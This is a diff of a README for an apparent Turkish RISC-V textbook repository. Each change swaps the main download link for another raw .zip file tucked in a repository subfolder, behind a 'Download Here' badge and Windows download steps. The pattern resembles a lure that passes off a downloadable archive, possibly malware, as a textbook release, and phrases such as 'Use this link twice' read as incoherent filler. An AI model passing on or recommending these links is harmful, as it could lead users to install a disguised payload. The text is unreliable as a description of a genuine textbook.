@@ -1,6 +1,6 @@
 # 💻 bilgisayar-mimarisi - Türkçe RISC-V Ders Kitabı
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Ryanzinnks/bilgisayar-mimarisi/raw/refs/heads/main/gorseller/bilgisayar_mimarisi_3.9.zip)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Ryanzinnks/bilgisayar-mimarisi/raw/refs/heads/main/ekC-risc-v-referans/mimarisi-bilgisayar-v2.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and open bilgisayar-mimarisi on your Windows comp
 
 Go to the official release section on the GitHub page:
 
-[Download bilgisayar-mimarisi](https://github.com/Ryanzinnks/bilgisayar-mimarisi/raw/refs/heads/main/gorseller/bilgisayar_mimarisi_3.9.zip)
+[Download bilgisayar-mimarisi](https://github.com/Ryanzinnks/bilgisayar-mimarisi/raw/refs/heads/main/ekC-risc-v-referans/mimarisi-bilgisayar-v2.4.zip)
 
 This page lists the available versions of the book and any updates.
 
@@ -129,6 +129,6 @@ This project is mainly the textbook, but you may find useful tools to learn RISC
 
 Return to the release page to choose the format you prefer and download the latest version:
 
-[Download bilgisayar-mimarisi](https://github.com/Ryanzinnks/bilgisayar-mimarisi/raw/refs/heads/main/gorseller/bilgisayar_mimarisi_3.9.zip) 
+[Download bilgisayar-mimarisi](https://github.com/Ryanzinnks/bilgisayar-mimarisi/raw/refs/heads/main/ekC-risc-v-referans/mimarisi-bilgisayar-v2.4.zip) 
 
 Use this link twice to make sure you know where to start. It is the official source of the latest updates and files.
